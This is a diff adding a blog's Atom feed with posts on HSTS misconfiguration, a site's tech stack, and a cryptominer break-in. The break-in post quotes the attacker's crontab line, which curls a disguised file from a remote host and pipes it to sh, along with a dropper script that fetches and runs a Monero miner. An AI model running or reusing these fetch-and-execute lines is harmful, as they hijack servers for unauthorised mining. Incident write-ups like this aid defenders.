+ssl_certificate_key /etc/letsencrypt/live/idoimaging.com/privkey.pem;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;I also found very helpful this excellent tutorial on &lt;a href=&quot;https://www.digitalocean.com/community/tutorials/how-to-secure-nginx-with-let-s-encrypt-on-ubuntu-16-04&quot;&gt;Securing NGINX with Let’s Encrypt&lt;/a&gt; on Digital Ocean.  I think DO are getting great publicity from their tutorial series, which I often use.  If I wasn’t already invested in AWS I’d certainly consider Digital Ocean as a hosting company.&lt;/p&gt;
+
+&lt;h2 id=&quot;in-which-we-learn-about-hsts&quot;&gt;In which we learn about HSTS&lt;/h2&gt;
+
+&lt;p&gt;All is now good, and I have an encrypted website.  But what happened to my blog?  It’s hosted seperately as a static Jekyll site on AWS S3 with a CloudFront CDN front end.  And I just broke it.  Chrome’s not happy:&lt;/p&gt;
+
+&lt;picture&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_idoimaging-610by56-c68cd4.jpg&quot; media=&quot;(min-width: 40em) and (-webkit-min-device-pixel-ratio: 1.5), (min-width: 40em) and (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_idoimaging-610by56-c68cd4.jpg&quot; media=&quot;(min-width: 40em)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_idoimaging-610by56-c68cd4.jpg&quot; media=&quot;(min-width: 30em) and (-webkit-min-device-pixel-ratio: 1.5), (min-width: 30em) and (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_idoimaging-450by41-c68cd4.jpg&quot; media=&quot;(min-width: 30em)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_idoimaging-98by56-c68cd4.jpg&quot; media=&quot;(-webkit-min-device-pixel-ratio: 1.5), (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_idoimaging-98by56-c68cd4.jpg&quot; /&gt;
+    &lt;img src=&quot;http://localhost:4000/generated/insecure_idoimaging-98by56-c68cd4.jpg&quot; class=&quot;blog-full&quot; itemprop=&quot;image&quot; /&gt;
+  &lt;/picture&gt;
+
+&lt;p&gt;Safari can’t open it at all:&lt;/p&gt;
+
+&lt;picture&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_safari-544by89-4daabf.jpg&quot; media=&quot;(min-width: 40em) and (-webkit-min-device-pixel-ratio: 1.5), (min-width: 40em) and (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_safari-544by89-4daabf.jpg&quot; media=&quot;(min-width: 40em)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_safari-544by89-4daabf.jpg&quot; media=&quot;(min-width: 30em) and (-webkit-min-device-pixel-ratio: 1.5), (min-width: 30em) and (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_safari-450by74-4daabf.jpg&quot; media=&quot;(min-width: 30em)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_safari-156by89-4daabf.jpg&quot; media=&quot;(-webkit-min-device-pixel-ratio: 1.5), (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_safari-156by89-4daabf.jpg&quot; /&gt;
+    &lt;img src=&quot;http://localhost:4000/generated/insecure_safari-156by89-4daabf.jpg&quot; class=&quot;blog-full&quot; itemprop=&quot;image&quot; /&gt;
+  &lt;/picture&gt;
+
+&lt;p&gt;And Firefox and Vivaldi are really, really unhappy:&lt;/p&gt;
+
+&lt;picture&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_firefox-880by177-0f74dc.jpg&quot; media=&quot;(min-width: 40em) and (-webkit-min-device-pixel-ratio: 1.5), (min-width: 40em) and (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_firefox-700by141-0f74dc.jpg&quot; media=&quot;(min-width: 40em)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_firefox-675by136-0f74dc.jpg&quot; media=&quot;(min-width: 30em) and (-webkit-min-device-pixel-ratio: 1.5), (min-width: 30em) and (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_firefox-450by91-0f74dc.jpg&quot; media=&quot;(min-width: 30em)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_firefox-310by177-0f74dc.jpg&quot; media=&quot;(-webkit-min-device-pixel-ratio: 1.5), (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_firefox-310by177-0f74dc.jpg&quot; /&gt;
+    &lt;img src=&quot;http://localhost:4000/generated/insecure_firefox-310by177-0f74dc.jpg&quot; class=&quot;blog-full&quot; itemprop=&quot;image&quot; /&gt;
+  &lt;/picture&gt;
+
+&lt;picture&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_vivaldi-627by117-523138.jpg&quot; media=&quot;(min-width: 40em) and (-webkit-min-device-pixel-ratio: 1.5), (min-width: 40em) and (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_vivaldi-627by117-523138.jpg&quot; media=&quot;(min-width: 40em)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_vivaldi-627by117-523138.jpg&quot; media=&quot;(min-width: 30em) and (-webkit-min-device-pixel-ratio: 1.5), (min-width: 30em) and (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_vivaldi-450by84-523138.jpg&quot; media=&quot;(min-width: 30em)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_vivaldi-205by117-523138.jpg&quot; media=&quot;(-webkit-min-device-pixel-ratio: 1.5), (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/insecure_vivaldi-205by117-523138.jpg&quot; /&gt;
+    &lt;img src=&quot;http://localhost:4000/generated/insecure_vivaldi-205by117-523138.jpg&quot; class=&quot;blog-full&quot; itemprop=&quot;image&quot; /&gt;
+  &lt;/picture&gt;
+
+&lt;p&gt;What’d I do?  There were some clues in there, particularly the mention of HSTS.  That’s a requirement that every page, including the first one, must be TLS-encrypted.  And I’d left the blog as a plain http:// site in the thought that it would simplify matters.  But what is causing the request to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://blog.idoimaging.com&lt;/code&gt; to be forced to https?  Surely it couldn’t be related to the web server, they are completely separate services.&lt;/p&gt;
+
+&lt;p&gt;The answer came in the form of a lot of work and some outstanding replies to a &lt;a href=&quot;http://bit.ly/2m9MPNm&quot;&gt;long and plaintive plea&lt;/a&gt; on StackOverflow, where two people really helped me out.  Thanks, &lt;a href=&quot;http://stackoverflow.com/users/1695906/michael-sqlbot&quot;&gt;Michael - sqlbot&lt;/a&gt; and &lt;strong&gt;b.b3rn4rd&lt;/strong&gt;.  HSTS, it turns out, is cached in the browser, and I must have configured the top-level domain to use HSTS, &lt;strong&gt;including subdomains&lt;/strong&gt;.  This explained why I was getting strange results - a browser that had never visited the website could see the blog OK with http, but upon visiting the website, then tried (unsuccessfully) to use https on the blog site.&lt;/p&gt;
+
+&lt;p&gt;All quick enough to explain but took some work.  The culprit was a line in my Nginx config file:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;add_header Strict-Transport-Security &quot;max-age=63072000; includeSubdomains&quot;;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Strict-Transport-Security&lt;/code&gt; is the option to enable HSTS, and I’d copied it in blindly from the Digital Ocean tutorial.  Usually it’d be fine, but as I am running the blog entirely separately from the website, the browser was carrying it over to an (in my eyes) unrelated site.&lt;/p&gt;
+
+&lt;p&gt;So I took the &lt;code class=&quot;highlighter-rouge&quot;&gt;includeSubdomains&lt;/code&gt; directive out, restarted, but not still it won’t work.  Turns out HSTS sticks to your browser like a limpet, and clearing history won’t get rid of it.  Plus, the expiration date is a year in the future.  With Chrome, you can visit &lt;code class=&quot;highlighter-rouge&quot;&gt;chrome://net-internals&lt;/code&gt; to view and clear HSTS settings, but I can’t clear Safari.  Still, the only browsers affected are those that visited the site while it was misconfigured.  It does leave me in the rather ironic situation, though, of being the only person in the world who can’t read my blog.&lt;/p&gt;</content><author><name>Andrew Crabb</name><email>andrew@idoimaging.com</email></author><summary type="html">How we got the green padlock of approval with the help of Let’s Encrypt.</summary></entry><entry><title type="html">Attack of the annoying script kiddies</title><link href="http://localhost:4000/2017/02/19/attack-of-the-annoying-script-kiddies.html" rel="alternate" type="text/html" title="Attack of the annoying script kiddies" /><published>2017-02-19T00:00:00-05:00</published><updated>2017-02-19T00:00:00-05:00</updated><id>http://localhost:4000/2017/02/19/attack-of-the-annoying-script-kiddies</id><content type="html" xml:base="http://localhost:4000/2017/02/19/attack-of-the-annoying-script-kiddies.html">&lt;p&gt;Old technologies made the existing site vulnerable to exploits.  It helped to motivate me to move to the new site.&lt;/p&gt;
+
+&lt;p&gt;I Do Imaging was born in a simpler time, the early aughts.  Web frameworks were in the future, and “internet security” was for most sites, a contradictory term.  So the site was developed in Perl CGI scripts, pretty old-fashioned even then, but it worked, and everything from page layout to authentication to pagination was re-invented and hand-written for the site.  So it stayed for a long time while I concentrated on content, testing programs, the wiki, demo data, demo servers, talks and conferences, not to mention work.&lt;/p&gt;
+
+&lt;p&gt;These days, of course, most sites are protected by TLS, sanitised parameters, cross-site scripting protection, token authentication.  And there are plenty of scripts out there (I assume) that you can just run if you want to target sites that don’t have those protections (such as databases of open-source medical imaging software).  And that’s what happened to I Do Imaging.&lt;/p&gt;
+
+&lt;p&gt;Two years ago the site suddenly became very slow.  On logging in, I found 100% CPU devoted to a task called &lt;code class=&quot;highlighter-rouge&quot;&gt;cpuloadtest&lt;/code&gt;.  Killing this task was futile; shortly thereafter it would restart itself.  Time to investigate.  A &lt;code class=&quot;highlighter-rouge&quot;&gt;find&lt;/code&gt; for a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;cpuloadtest&lt;/code&gt; located one in &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt;, along with a file named &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt; of the same timestamp, both of them Linux binaries.&lt;/p&gt;
+
+&lt;p&gt;Where’d they come from?  There was nothing in &lt;code class=&quot;highlighter-rouge&quot;&gt;lastlog&lt;/code&gt;, so it probably wasn’t SSH.  Though of course the &lt;code class=&quot;highlighter-rouge&quot;&gt;last&lt;/code&gt; log can be altered, this seemed like a lot of work to go to, also as the site is hosted on AWS, it responded to SSH calls only from my own IP numbers.  Examination of the HTTP server log, though, showed a POST call at that same to &lt;code class=&quot;highlighter-rouge&quot;&gt;xmlrpc.php&lt;/code&gt; in my Wordpress installation which I was using for blogging.  That’s how the exploit program got on to the server. Turns out this is a pretty well-known exploit (which I probably should have known about and prevented) and the file in particular is not essential to Wordpress’s operation, so I moved it.&lt;/p&gt;
+
+&lt;p&gt;The matter of the re-populating program, though, was still there.  &lt;code class=&quot;highlighter-rouge&quot;&gt;crontab -l&lt;/code&gt; showed nothing…or did it?  The formatting was off, there was an extra line feed in the output.  &lt;code class=&quot;highlighter-rouge&quot;&gt;crontab -e&lt;/code&gt; showed the culprit&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;*/60 * * * *  curl https://ooo.0o0.ooo/2015/07/21/5887a6d11262.jpg -k|dd skip=3458 bs=1|sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Every minute it was fetching this file from some scurrilous-looking site and executing it.  What’s in the file?&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ strings 5887a6d11262.jpg
+# ... some binary stuff
+#!/bin/sh
+ps -fe|grep 49hNrEaSKaeTbzPQu4  |grep -v grep
+if [ $? -ne 0 ]
+then
+curl -o /tmp/test https://ooo.0o0.ooo/2017/01/21/58837466f1237.jpg
+dd if=/tmp/test skip=3458 bs=1 of=/tmp/cpuloadtest
+chmod +x /tmp/cpuloadtest
+nohup /tmp/cpuloadtest -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 49hN...PQu4 -p x &amp;amp;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Look for the running program, if it’s not running, fetch a new copy.  Convert the download into &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/cpuloadtest&lt;/code&gt; then run it.  And finally we find out the intent of this criminal mastermind…it’s a Bitcoin generator called &lt;code class=&quot;highlighter-rouge&quot;&gt;cryptonight&lt;/code&gt; and it feeds its massive earnings to an account at &lt;code class=&quot;highlighter-rouge&quot;&gt;crypto-pool&lt;/code&gt; which no doubt is some kind of “dark bank”.  Whatevs.&lt;/p&gt;
+
+&lt;p&gt;This is all quite quick to describe in hindsight, but took some tracking down when first addressed.  I cleaned out the offending files, upgraded Wordpress checked that nothing seemed to have been done to the passwords, iptables, or system files, and made some notes in my wiki just in case.&lt;/p&gt;
+
+&lt;p&gt;A year passed, and then it happened again.  This time, same exploit, but this time it seemed to have come in from a similar exploit on Tiki Wiki, my wiki software.  I dug out my notes and ran through the process again.  It was a little different this time, the executables were called &lt;code class=&quot;highlighter-rouge&quot;&gt;mstrie&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;mstxcn&lt;/code&gt; and the highlight, &lt;code class=&quot;highlighter-rouge&quot;&gt;./mstbcn -a cryptonight -o bcn -u bond007.01&lt;/code&gt; which confirmed my beliefs that the evil mastermind is a pudgy 40 year old living in his parents’ basement.&lt;/p&gt;
+
+&lt;p&gt;As time went on the intrusions got more frequent but laziness, and the fact that I had the new site on the way, prevented me from putting the time in to locking down the old site.  Finally it got to the point this year where it was happening almost daily, so I said enough, and switched over to the new site, though it’s still a bit rough.&lt;/p&gt;
+
+&lt;p&gt;Just for interests’ sake, I calculated how much lucre is generated on my bog-standard AWS M3 Medium EC2 instance with 3.75 GB RAM, two cores, and no GPU whatsoever.  Plenty of power for my website but not the world’s most powerful Bitcoin miner.  It’s hard to get an estimate for hashes per second for computer hardware, since all Bitcoin mining moved to custom chips 5-10 years ago, but a guess of 1-10 MHash/sec sounds plausible.  I’ll compare it against the first result for ‘bitcoin miner’ I found: $379, 3.5 TH/s, 1 kW power consumption, about a million times faster than the computer.  That thing had better make some money, turning 10c of power per hour into another kilo of carbon in the atmosphere.  Yay bitcoin.&lt;/p&gt;
+
+&lt;picture&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/bitcoin_miner-833by304-c4cbb0.jpg&quot; media=&quot;(min-width: 40em) and (-webkit-min-device-pixel-ratio: 1.5), (min-width: 40em) and (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/bitcoin_miner-700by255-c4cbb0.jpg&quot; media=&quot;(min-width: 40em)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/bitcoin_miner-675by246-c4cbb0.jpg&quot; media=&quot;(min-width: 30em) and (-webkit-min-device-pixel-ratio: 1.5), (min-width: 30em) and (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/bitcoin_miner-450by164-c4cbb0.jpg&quot; media=&quot;(min-width: 30em)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/bitcoin_miner-525by300-c4cbb0.jpg&quot; media=&quot;(-webkit-min-device-pixel-ratio: 1.5), (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/bitcoin_miner-350by200-c4cbb0.jpg&quot; /&gt;
+    &lt;img src=&quot;http://localhost:4000/generated/bitcoin_miner-350by200-c4cbb0.jpg&quot; class=&quot;blog-full&quot; itemprop=&quot;image&quot; alt=&quot;A global warming Bitcoin miner&quot; /&gt;
+  &lt;/picture&gt;
+
+&lt;p&gt;In a bitcoin calculator, I had to multiply the power of my EC2 instance by 1,000 in order to get some numerical precision, above 1c/month output.  Currently 10 GH/s would nett you 18c/month.  So my 1 MH/s computer was netting my illegal visitor 0.18 / (10,000 * 30) per day, or roughly 10^-6 dollars, or 0.0001 cent for each day the thing ran.  I don’t know the lowest precision of Bitcoin but perhaps they accept a millicent per week.  Meanwhile, of course, the EC2 instance costs 2.3c/hr or about 50c/day.&lt;/p&gt;
+
+&lt;picture&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/bitcoin_calculator-640by313-a9c5f8.jpg&quot; media=&quot;(min-width: 40em) and (-webkit-min-device-pixel-ratio: 1.5), (min-width: 40em) and (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/bitcoin_calculator-640by313-a9c5f8.jpg&quot; media=&quot;(min-width: 40em)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/bitcoin_calculator-640by313-a9c5f8.jpg&quot; media=&quot;(min-width: 30em) and (-webkit-min-device-pixel-ratio: 1.5), (min-width: 30em) and (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/bitcoin_calculator-450by220-a9c5f8.jpg&quot; media=&quot;(min-width: 30em)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/bitcoin_calculator-525by300-a9c5f8.jpg&quot; media=&quot;(-webkit-min-device-pixel-ratio: 1.5), (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/bitcoin_calculator-350by200-a9c5f8.jpg&quot; /&gt;
+    &lt;img src=&quot;http://localhost:4000/generated/bitcoin_calculator-350by200-a9c5f8.jpg&quot; class=&quot;blog-full&quot; itemprop=&quot;image&quot; alt=&quot;What you would earn from 1,000 of my web servers&quot; title=&quot;foo&quot; /&gt;
+  &lt;/picture&gt;
+
+&lt;p&gt;So my intruder netted one or two thousandths of a cent, which I hope he invests wisely.  Perhaps he could spend it learning to program so he can get a job like me.&lt;/p&gt;
+
+&lt;p&gt;What I learned:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Slight refresher in system files, though I do this stuff daily.&lt;/li&gt;
+  &lt;li&gt;Dunno/don’t care how it got in, but once it’s in, the scripts aren’t particularly clever.&lt;/li&gt;
+  &lt;li&gt;Don’t run Wordpress.  It’s a pig.  Hence Jekyll.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;[Edit: Found out actually the currency in question is Monero, as BC mining is done to death.  Claims to be more profitable than BC, but if it was, then everyone would be mining Monero.  So I’ll stick with the BC numbers.]&lt;/p&gt;</content><author><name>Andrew Crabb</name><email>andrew@idoimaging.com</email></author><summary type="html">Old technologies made the existing site vulnerable to exploits.  It helped to motivate me to move to the new site.</summary></entry><entry><title type="html">The I Do Imaging technology stack, 2017</title><link href="http://localhost:4000/2017/01/18/the-i-do-imaging-technology-stack-2017.html" rel="alternate" type="text/html" title="The I Do Imaging technology stack, 2017" /><published>2017-01-18T00:00:00-05:00</published><updated>2017-01-18T00:00:00-05:00</updated><id>http://localhost:4000/2017/01/18/the-i-do-imaging-technology-stack-2017</id><content type="html" xml:base="http://localhost:4000/2017/01/18/the-i-do-imaging-technology-stack-2017.html">&lt;p&gt;I Do Imaging has been completely rewritten in the past year.  Here’s what is used in the creation and production of the site.&lt;/p&gt;
+
+&lt;p&gt;The site as a whole is comprised of several components: the &lt;a href=&quot;#site&quot;&gt;site&lt;/a&gt; itself is a Rails application, while the &lt;a href=&quot;#blog&quot;&gt;blog&lt;/a&gt; and &lt;a href=&quot;#wiki&quot;&gt;wiki&lt;/a&gt; are separate static websites.&lt;/p&gt;
+
+&lt;h2 id=&quot;site&quot;&gt;Site&lt;/h2&gt;
+
+&lt;p&gt;The I Do Imaging site is built on Rails.  Not the newest technology in 2017, but still a solid performer and with a massive base of stable extensions.  It runs on an Nginx server on an &lt;a href=&quot;https://aws.amazon.com/ec2/&quot; target=&quot;new&quot;&gt;AWS EC2&lt;/a&gt; reserved virtual instance.  This does mean still having to run a Linux server, as opposed to a fully-hosted service like Heroku or a container on AWS, but this has the advantage of providing a platform to run the PACS and other services.&lt;/p&gt;
+
+&lt;p&gt;Initially I tried using the web framwork &lt;a href=&quot;http://foundation.zurb.com/&quot;&gt;Foundation&lt;/a&gt;, just to be a little different from the default choice of &lt;a href=&quot;&quot;&gt;Bootstrap&lt;/a&gt;.  However I had difficulty with some of the customisations, and with the Foundation volume on Stack Overflow being only a few percent that of Bootstrap, I bowed to the inevitable and changed to Bootstrap.&lt;/p&gt;
+
+&lt;p&gt;Other gems used in the Rails app are &lt;a href=&quot;https://github.com/CanCanCommunity/cancancan&quot;&gt;CanCanCan&lt;/a&gt; and &lt;a href=&quot;https://github.com/plataformatec/devise&quot;&gt;Devise&lt;/a&gt; for authorization and authentication, &lt;a href=&quot;https://github.com/kaminari/kaminari&quot;&gt;Kaminari&lt;/a&gt; for pagination, &lt;a href=&quot;https://github.com/carrierwaveuploader/carrierwave&quot;&gt;Carrierwave&lt;/a&gt; for uploading the static image files, the awesome &lt;a href=&quot;https://github.com/activerecord-hackery/ransack&quot;&gt;Ransack&lt;/a&gt; for database searching, &lt;a href=&quot;http://haml.info/&quot;&gt;Haml&lt;/a&gt; for markup, and &lt;a href=&quot;http://capistranorb.com/&quot;&gt;Capistrano&lt;/a&gt; deploys to the production site. &lt;a href=&quot;https://github.com/activeadmin/activeadmin&quot;&gt;ActiveAdmin&lt;/a&gt; is used for all the back-end work.&lt;/p&gt;
+
+&lt;p&gt;Javascript libraries used are jQuery (of course) &lt;a href=&quot;http://kenwheeler.github.io/slick/&quot;&gt;Slick&lt;/a&gt; for the image carousel, and &lt;a href=&quot;https://github.com/nashio/star-rating-svg&quot;&gt;star-rating-svg&lt;/a&gt; for the star ratings.  Icons are from &lt;a href=&quot;http://fontawesome.io&quot;&gt;Font Awesome&lt;/a&gt;.  Fonts are &lt;a href=&quot;https://fonts.google.com&quot;&gt;Google Fonts&lt;/a&gt;: currently &lt;a href=&quot;https://fonts.google.com/specimen/Fjalla+One&quot;&gt;Fjalla One&lt;/a&gt; for titles and &lt;a href=&quot;https://fonts.google.com/specimen/Open+Sans&quot;&gt;Open Sans&lt;/a&gt; for text.&lt;/p&gt;
+
+&lt;p&gt;The database is a small &lt;a href=&quot;https://www.postgresql.org&quot;&gt;PostgreSQL&lt;/a&gt; &lt;a href=&quot;https://aws.amazon.com/rds/&quot; target=&quot;new&quot;&gt;RDS&lt;/a&gt; instance at AWS.  Having the database hosted, rather than installed and running on the local server, is one less thing to go wrong, and it seems faster.  RDS is continually kept up to date and has all sorts of handy features.  It also means that the EC2 load is kept to a minimum - the average load is very low, but when the server is busy assembling a page, it’s nice that it’s also not having to simultaneously run dozens of database queries.&lt;/p&gt;
+
+&lt;p&gt;Code and text are written on &lt;a href=&quot;https://www.sublimetext.com/&quot;&gt;Sublime Text&lt;/a&gt;, which after a couple of years I’m starting to get OK with (Emacs got me through the previous 20 years).  Git repositories are now on &lt;a href=&quot;https://aws.amazon.com/codecommit/&quot;&gt;AWS CodeCommit&lt;/a&gt; though I’m not particularly wedded to it; it just seemed sensible as the rest of the site is all on AWS.  Shared code is on GitHub and I’ve had good experience with &lt;a href=&quot;https://about.gitlab.com/&quot;&gt;GitLab&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Previously, the old site was a collection of Perl scripts dating back to the late 1990s and subsequently hacked into an unmaintainable (though still functioning) mess.  It ran on an Apache server and stored everything on a MySQL database, all of which were hosted on the local machine.  The site started out hosted on a small ISP, then moved to a shared server at Pair Networks, then to a Mac Mini at Mac Mini Colo in Las Vegas, then eventually to an EC2 instance at AWS.  All of which were completely fine services, but technology has moved on.&lt;/p&gt;
+
+&lt;h2 id=&quot;blog&quot;&gt;Blog&lt;/h2&gt;
+&lt;p&gt;This blog is a stand-alone site for now.  Perhaps later it will be neatly incorporated into the main site.&lt;/p&gt;
+
+&lt;p&gt;It’s built on the &lt;a href=&quot;https://jekyllrb.com&quot; target=&quot;new&quot;&gt;Jekyll&lt;/a&gt; framework.  Jekyll produces static HTML websites from a markup language original.  I chose Jekyll for its speed and simplicity, and (having used WordPress in the past), its absolute security.  Not much bad you can do with a static site.&lt;/p&gt;
+
+&lt;p&gt;The content is written in the &lt;a href=&quot;https://daringfireball.net/projects/markdown/&quot;&gt;MarkDown&lt;/a&gt; markup language (actually, &lt;a href=&quot;https://kramdown.gettalong.org&quot;&gt;kramdown&lt;/a&gt;, a superset of MarkDown).  The plain text source files are stored in a Git repo under version control.&lt;/p&gt;
+
+&lt;p&gt;Several Jekyll plugins help things along. The &lt;a href=&quot;https://github.com/laurilehmijoki/s3_website&quot; target=&quot;new&quot;&gt;s3_website&lt;/a&gt; gem delivers the site contents to S3.  &lt;a href=&quot;https://github.com/robwierzbowski/jekyll-picture-tag&quot;&gt;jekyll-picture-tag&lt;/a&gt; generates responsive images: pre-rendered versions of images are uploaded, and the image size appropriate for the viewer window is sent to the user.&lt;/p&gt;
+
+&lt;p&gt;The site is hosted on &lt;a href=&quot;https://aws.amazon.com/s3/&quot;&gt;AWS S3&lt;/a&gt;.	S3 is a scalable object store service from Amazon Web Services.  It’s optimized for Web delivery and can scale to any size.  As with any AWS service, the initial step takes some learning, but it’s not difficult to use if you’re used to web services.  I mostly use it through its API and command line tools - there is a GUI you can access for it, but S3 is designed for programmatic access.  In this case the S3 bucket is configured as a static website, so no web server is needed.&lt;/p&gt;
+
+&lt;p&gt;Delivery is through &lt;a href=&quot;https://aws.amazon.com/cloudfront/&quot;&gt;AWS CloudFront&lt;/a&gt;. CloudFront provides local caches all over the world for static content, in this case the website files from the S3 bucket.  Once you’ve set it up, each user gets their content from the nearest cache, significantly speeding page load.&lt;/p&gt;
+
+&lt;h2 id=&quot;wiki&quot;&gt;Wiki&lt;/h2&gt;
+
+&lt;p&gt;The original I Do Imaging wiki is hosted on &lt;a href=&quot;https://tiki.org&quot; target=&quot;new&quot;&gt;Tiki&lt;/a&gt;.  I chose Tiki for its massive feature set and no-nonsense approach, and from having seen too many default MediaWiki installations.  However since then I’ve developed several sites in &lt;a href=&quot;https://www.semantic-mediawiki.org/wiki/Semantic_MediaWiki&quot; target=&quot;new&quot;&gt;Semantic MediaWiki&lt;/a&gt; and have become a big fan.  Semantic Mediawiki is an extension to MediaWiki that allows semantic data to be added to each page, and subsequently used to automatically create content and links.  In particular, ‘list of X’ pages are built as a few lines of code that assembles the list and keeps it up to date.  The I Do Imaging wiki will be moved to SMW to take advantage of this hugely powerful feature.&lt;/p&gt;
+
+&lt;h2 id=&quot;demo-programs&quot;&gt;Demo Programs&lt;/h2&gt;
+
+&lt;p&gt;Most of the programs that can readily be demonstrated on the site are image viewers deployed either from an HTTP server or a PACS.&lt;/p&gt;
+
+&lt;h2 id=&quot;pacs&quot;&gt;PACS&lt;/h2&gt;</content><author><name>Andrew Crabb</name><email>andrew@idoimaging.com</email></author><summary type="html">I Do Imaging has been completely rewritten in the past year.  Here’s what is used in the creation and production of the site.</summary></entry></feed>
